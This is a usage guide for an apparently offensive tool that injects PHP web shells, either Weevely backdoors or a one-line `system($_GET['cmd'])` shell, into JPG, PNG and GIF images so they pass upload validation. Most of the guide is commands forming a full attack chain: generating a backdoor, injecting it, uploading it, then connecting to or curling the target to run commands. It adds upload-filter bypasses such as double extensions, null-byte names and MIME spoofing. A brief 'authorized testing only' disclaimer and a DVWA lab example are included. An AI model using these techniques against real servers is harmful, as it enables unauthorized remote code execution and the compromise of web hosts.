# SilentTag - Usage Guide

## Overview
This tool injects PHP backdoors (Weevely or custom) into legitimate image files to create polyglot files that bypass upload validation while remaining executable.

## Quick Start

### 1. Create a Weevely Backdoor
```bash
weevely generate mypassword backdoor.php
```

### 2. Create or Use a Real Image
```bash
# Option A: Use the tool to create a sample image
python3 silenttag_cli.py --create-sample sample.jpg

# Option B: Use your own image
# Just provide any real JPG, PNG, or GIF file
```

### 3. Inject Shell into Image
```bash
python3 silenttag_cli.py sample.jpg backdoor.php -o malicious.jpg
```

### 4. Upload and Connect
```bash
# Upload malicious.jpg to target
# Then connect with Weevely
weevely http://target.com/uploads/malicious.jpg mypassword
```

## Command Syntax

```bash
python3 silenttag_cli.py [IMAGE] [SHELL] [OPTIONS]
```

### Arguments
- `IMAGE` - Path to legitimate image file (JPG, PNG, GIF, BMP)
- `SHELL` - Path to PHP shell file (Weevely backdoor or custom)

### Options
- `-o, --output FILE` - Specify output filename
- `-m, --method METHOD` - Injection method (append/prepend/comment)
- `--create-sample FILE` - Create a minimal valid image for testing

## Injection Methods

### 1. APPEND (Default - Most Compatible)
Appends PHP shell to the end of image data.
```bash
python3 silenttag_cli.py image.jpg shell.php -m append
```
**Pros:** Works with all image types, most reliable  
**Cons:** May be detected by advanced validation

### 2. PREPEND (Header Preservation)
Adds valid image header, then PHP, then rest of image.
```bash
python3 silenttag_cli.py image.png shell.php -m prepend
```
**Pros:** Maintains valid image structure  
**Cons:** May break some image viewers

### 3. COMMENT (Advanced)
Injects PHP into image metadata/comment sections.
```bash
python3 silenttag_cli.py image.gif shell.php -m comment
```
**Pros:** Stealthier, harder to detect  
**Cons:** Format-specific, may not work with all images

## Complete Examples

### Example 1: Basic Weevely Injection
```bash
# Generate backdoor
weevely generate secretpass backdoor.php

# Create sample image
python3 shell_injector.py --create-sample fake.jpg

# Inject shell
python3 shell_injector.py fake.jpg backdoor.php -o payload.jpg

# Upload payload.jpg to target, then connect
weevely http://target.com/uploads/payload.jpg secretpass
```

### Example 2: Using Real Image (Stealthier)
```bash
# Download a real image
wget https://example.com/cat.jpg

# Generate Weevely shell
weevely generate mypass shell.php

# Inject into real image
python3 shell_injector.py cat.jpg shell.php -o cat_malicious.jpg

# The resulting file looks like a normal cat image!
```

### Example 3: Multiple Format Testing
```bash
# Test with different image formats
python3 shell_injector.py --create-sample test.jpg
python3 shell_injector.py --create-sample test.png
python3 shell_injector.py --create-sample test.gif

# Inject into all three
python3 shell_injector.py test.jpg backdoor.php -o payload1.jpg
python3 shell_injector.py test.png backdoor.php -o payload2.png
python3 shell_injector.py test.gif backdoor.php -o payload3.gif

# Upload whichever format the target accepts
```

### Example 4: Custom PHP Shell
```bash
# Create your own simple shell
cat > simple.php << 'EOF'
<?php system($_GET['cmd']); ?>
EOF

# Inject into image
python3 shell_injector.py photo.jpg simple.php -o backdoored.jpg

# Use via URL parameter
curl "http://target.com/uploads/backdoored.jpg?cmd=whoami"
```

## Workflow with DVWA

### Complete Attack Chain
```bash
# 1. Generate Weevely backdoor
weevely generate dvwa123 dvwa_shell.php

# 2. Create or use image
python3 shell_injector.py --create-sample innocent.gif

# 3. Inject shell
python3 shell_injector.py innocent.gif dvwa_shell.php -o malicious.gif

# 4. Upload via automated script
python3 upload_bypass.py  # (modify to use malicious.gif)

# 5. Connect
weevely http://192.168.43.106/dvwa/hackable/uploads/malicious.gif dvwa123
```

## Tips & Tricks

### Bypass Techniques
1. **File Extension Tricks:**
   - Use double extensions: `shell.php.jpg`
   - Null byte injection: `shell.php%00.jpg`
   - Case variation: `shell.PhP`

2. **MIME Type Spoofing:**
   - Tool automatically preserves valid image headers
   - Upload with Content-Type: image/jpeg

3. **Content-Type Validation:**
   - Append method keeps original image magic bytes
   - File validates as both image AND PHP

### Verification
```bash
# Check file is valid image
file malicious.jpg

# Check magic bytes
xxd malicious.jpg | head

# Test locally
php -r "include 'malicious.jpg';"
```

## Troubleshooting

### Image Not Accepted
- Try different injection methods (`-m prepend` or `-m comment`)
- Use a different image format (GIF often most permissive)
- Try with a real downloaded image instead of generated one

### Shell Not Executing
- Ensure server processes images through PHP handler
- Try accessing directly: `http://target.com/uploads/image.jpg`
- Check file was uploaded to correct directory
- Verify PHP execution is enabled in uploads directory

### Weevely Connection Fails
- Test with curl first: `curl http://target/image.jpg`
- Verify file is accessible (200 status code)
- Check password is correct
- Ensure Weevely is fixed for Python 3.13 (run fix_weevely.sh)

## Security Notes

⚠️ **For Educational/Authorized Testing Only**
- Only use on systems you own or have permission to test
- Demonstrates real attack techniques used in web app pentesting
- Understanding helps developers implement proper upload validation

## Advanced Usage

### Batch Processing
```bash
# Inject same shell into multiple images
for img in *.jpg; do
    python3 shell_injector.py "$img" backdoor.php -o "payload_${img}"
done
```

### Integration with Upload Scripts
```python
# In your upload script
import subprocess

# Generate injected image
subprocess.run([
    'python3', 'shell_injector.py',
    'image.jpg', 'backdoor.php',
    '-o', 'payload.jpg'
])

# Then upload payload.jpg
```

## File Sizes
- Original image: varies
- Shell size: ~500-700 bytes (Weevely)
- Final file: original + shell + ~1 byte (newline)
- Example: 10KB image + 600B shell = 10.6KB final

## Supported Formats
- ✅ JPEG/JPG - Excellent compatibility
- ✅ GIF - Best for bypasses (GIF89a/GIF87a)
- ✅ PNG - Good compatibility
- ✅ BMP - Limited support
- ⚠️ Others - Use prepend method

---

**Created:** 2025-11-04  
**Tool:** shell_injector.py  
**Purpose:** Web application penetration testing - file upload bypass
